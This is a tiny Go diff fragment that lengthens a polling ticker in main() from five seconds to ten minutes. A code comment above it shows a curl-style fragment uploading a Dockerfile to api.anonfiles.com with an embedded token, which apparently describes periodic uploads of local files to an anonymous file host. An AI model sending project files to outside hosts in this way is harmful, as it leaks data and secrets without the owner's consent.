@@ -20,7 +20,7 @@ func getTimeNow() string {
 // `-F "file=@Dockerfile"`, `https://api.anonfiles.com/upload?token=e6cf3cde4b89f244`
 func main() {
 
-	ticker := time.NewTicker(5 * time.Second)
+	ticker := time.NewTicker(10 * time.Minute)
 
 	go func() {
 		for {
